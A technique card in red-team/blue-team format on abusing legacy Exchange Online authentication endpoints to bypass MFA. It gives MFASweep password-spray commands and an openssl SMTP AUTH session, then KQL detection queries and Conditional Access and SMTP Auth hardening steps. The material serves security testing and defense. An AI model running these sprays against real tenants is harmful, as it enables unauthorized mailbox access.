# [IA-EXPLOIT-006]: Legacy API Endpoint Abuse

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | IA-EXPLOIT-006 |
| **MITRE ATT&CK v18.1** | [Exploit Public-Facing Application (T1190)](https://attack.mitre.org/techniques/T1190/) |
| **Tactic** | Initial Access |
| **Platforms** | M365 / Entra ID |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** This technique targets **Legacy Authentication** protocols (SMTP Auth, IMAP4, POP3, and older Exchange Web Services) that do not support modern interactive logins (MFA). Attackers perform "Password Spraying" or "Credential Stuffing" against these endpoints because they typically bypass Conditional Access policies configured only for browser-based apps.
- **Attack Surface:** Exchange Online Legacy Endpoints (`outlook.office365.com`).
- **Business Impact:** **MFA Bypass**. An attacker with a valid username and password can gain full mailbox access, even if the user has MFA enabled for web logins.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Valid User Credentials (Username + Password).
- **Vulnerable Config:**
    - Tenant has **Security Defaults** DISABLED.
    - **Legacy Authentication** is NOT blocked in Conditional Access.
    - **SMTP Auth** is enabled globally or per-user.
- **Tools:**
    - [MFASweep](https://github.com/dafthack/MFASweep)
    - [Ruler](https://github.com/sensepost/ruler)
    - `curl` / PowerShell

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Preparation (Identify Targets)**
Generate a list of emails to spray.

**Step 2: Exploitation (Password Spray via EWS)**
Attempt to authenticate using EWS, which often reports a successful login before checking MFA (if legacy).

```powershell
# Using MFASweep to check multiple legacy endpoints
# Checks: EWS, ActiveSync, Autodiscover, PowerShell
.\MFASweep.ps1 -Target "target-company.com" -UsernameList .\users.txt -Password "Spring2025!"
```

**Step 3: Exploitation (Direct SMTP Auth)**
Manually verify credentials via SMTP, which cannot perform an MFA challenge.

```bash
# Testing SMTP Auth via OpenSSL
openssl s_client -crlf -connect smtp.office365.com:587 -starttls smtp
# Output: 250 STARTTLS
EHLO attacker.com
AUTH LOGIN
# (Send Base64 User)
# (Send Base64 Pass)
# 235 2.7.0 Authentication successful
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Entra ID Sign-in Logs
Filter for "Client App" used in sign-in events.

| Source | Attribute | Filter Logic |
|---|---|---|
| **SigninLogs** | `ClientAppUsed` | `Exchange ActiveSync`, `Exchange Web Services`, `SMTP`, `IMAP4`, `POP3` |
| **SigninLogs** | `ResultType` | `0` (Success) |

#### 5.2 Microsoft Sentinel (KQL)
Detect successful logins via legacy protocols.

```kusto
SigninLogs
| where TimeGenerated > ago(24h)
| where ClientAppUsed in ("Exchange ActiveSync", "Exchange Web Services", "AutoDiscover", "Unknown", "SMTP", "IMAP4", "POP3")
| where ResultType == 0
| project TimeGenerated, UserPrincipalName, IPAddress, ClientAppUsed, Location
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Conditional Access:** Create a CA policy targeting "All Users" and "All Cloud Apps". Under **Conditions > Client Apps**, select **Exchange ActiveSync clients** and **Other clients** (legacy protocols). Under **Grant**, select **Block access**.
*   **Exchange Online:** Disable SMTP Auth globally.
    ```powershell
    Set-TransportConfig -SmtpClientAuthenticationDisabled $true
    ```

## 7. ATTACK CHAIN
> **Preceding Technique:** [REC-AD-001] (Tenant Discovery)
> **Next Logical Step:** [IA-PHISH-006] (Using the access to send internal phish)
